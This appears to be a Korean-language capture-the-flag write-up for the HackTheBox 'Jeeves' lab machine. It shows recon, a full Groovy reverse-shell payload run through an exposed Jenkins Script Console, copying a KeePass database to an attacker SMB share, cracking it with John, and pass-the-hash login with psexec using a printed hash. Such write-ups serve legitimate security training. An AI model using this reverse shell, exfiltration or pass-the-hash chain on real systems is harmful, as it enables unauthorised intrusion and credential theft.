# Jeeves - HackTheBox
## Recon
```bash
sudo nmap -p 80,135,445,50000 -sC -sV -vv -oA jeeves 10.129.228.112
```
<img width="1104" height="262" alt="image" src="https://github.com/user-attachments/assets/713f3690-f007-4e7e-926a-f6896a8a2a16" />

- HTTP(80)
- SMB(445)
- HTTP(50000)

---
## HTTP(80)
### banner grabbing
<img width="1104" height="300" alt="image" src="https://github.com/user-attachments/assets/25eb61fc-fd78-4d43-ba57-620e77a459b0" />

### askjeeves
- 메인페이지에 `askjeeves`가 적혀 있는데 어떤 것인지 감을 잡지는 못함.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b143be08-9210-439d-b2a3-472c2622e83b" />

---
## HTTP(50000)
### banner grabbing
<img width="1104" height="259" alt="image" src="https://github.com/user-attachments/assets/ac2ec78b-db76-4c1e-a0d9-b11be70e3a5f" />

### gobuster
- `/askjeeves` 경로 발견.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.228.112:50000 -x asp,aspx,md,txt -t 50
```
<img width="1104" height="373" alt="image" src="https://github.com/user-attachments/assets/4e71f63f-8dc6-4e2a-8d8e-937381477519" />

### Jenkins
- `/askjeeves` 경로로 접속.
- `Jenkins 2.87`
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/e1d75e08-0b75-4aee-813c-983eb514e7db" />

<br>
<br>

- `Manage Jenkins` -> `Script Console`에서 명령어 실행 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b9bc0581-7752-446f-98c9-f3753fa0bf82" />

<br>
<br>

- 리버스 셸 명령어 실행.
```groovy
String host="10.10.14.23";
int port=80;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9046c4f3-e9bb-460c-9b82-a0e2d7609b8b" />

<br>
<br>

- 셸 획득.
<img width="1104" height="204" alt="image" src="https://github.com/user-attachments/assets/7e2a2884-a94b-4f18-978a-03fc23d4d86f" />

---
## Privesc
- `c:\users\kohsuke\documents`에서 `CEH.kdbx` 발견.
<img width="1103" height="238" alt="image" src="https://github.com/user-attachments/assets/a6ed836c-10e6-44e9-87f8-3a37930ef10b" />

<br>
<br>

- 로컬에서 `SMB server`를 생성.
```bash
impacket-smbserver -smb2support test ./test
```
<img width="1103" height="188" alt="image" src="https://github.com/user-attachments/assets/aca2d1d6-cb9a-4f9f-85a2-47613b26a706" />

<br>
<br>

- `CEH.kdbx` 복사.
```powershell
copy CEH.kdbx \\10.10.14.23\test
```
<img width="1103" height="83" alt="image" src="https://github.com/user-attachments/assets/67a8cfd9-88f9-4ea3-ba6b-8c99b8331cb8" />

<br>
<br>

- `kpcli`로 파일을 확인하려 했으나 비밀번호 필요.
<img width="1103" height="63" alt="image" src="https://github.com/user-attachments/assets/ea38e037-9cb9-4e82-b884-1d6e53829ecb" />

<br>
<br>

- 해시화하여 크래킹.
```bash
keepass2john CEH.kdbx >hash

john hash --wordlist=~/util/rockyou.txt
```
<img width="1103" height="100" alt="image" src="https://github.com/user-attachments/assets/c82860b4-fa01-466a-8368-9d15b220411a" />

<br>
<br>

- `moonshine1` 비밀번호를 입력하여 실행.
<img width="1104" height="149" alt="image" src="https://github.com/user-attachments/assets/4dc20093-8ad8-4c7f-bb27-f2a82f35aa81" />

<br>
<br>

- 각각의 경로들에서 비밀번호가 적혀있어 비밀번호들을 로컬에 수집.
```
find .

show -f <number>
```
<img width="1104" height="167" alt="image" src="https://github.com/user-attachments/assets/bf166ac8-8822-44a9-b1dd-f5db780fc877" />

<br>
<br>

- `nxc`를 사용하여 로그인 테스트.
<img width="1104" height="277" alt="image" src="https://github.com/user-attachments/assets/e477ddcf-779b-4c00-8d12-6d14aa0e7f77" />

<br>
<br>

- 하나는 해시처럼 보여서 해시 로그인 시도.
<img width="1104" height="125" alt="image" src="https://github.com/user-attachments/assets/99c75930-696a-4394-bacd-004c250ed026" />

<br>
<br>

- `psexec`를 사용하여 로그인.
```bash
impacket-psexec administrator@10.129.228.112 -hashes 'e0fb1fb85756c24235ff238cbe81fe00:e0fb1fb85756c24235ff238cbe81fe00'
```
<img width="1104" height="335" alt="image" src="https://github.com/user-attachments/assets/1d4b0a0a-ef50-46fc-a05f-49d280b8ad83" />

---
## FLAG
- `c:\users\kohsuke\desktop\user.txt`
<img width="1104" height="239" alt="image" src="https://github.com/user-attachments/assets/b8e2b7d8-cf93-4c8d-9f9a-bb829bd4fc23" />

<br>
<br>

- `c:\users\administrator\desktop`에 `root.txt`가 보이지 않음.
<img width="1104" height="258" alt="image" src="https://github.com/user-attachments/assets/98916038-5131-4a84-a18c-774b500c2c5b" />

<br>
<br>

- 은닉되어 있을 수 있다 생각하여 `dir /R`를 사용하여 확인.
- `more < hm.txt:root.txt:$DATA` 커맨드를 사용하여 FLAG 획득.
<img width="1104" height="275" alt="image" src="https://github.com/user-attachments/assets/e36cfe78-b12a-4d91-85da-0b388c384f68" />
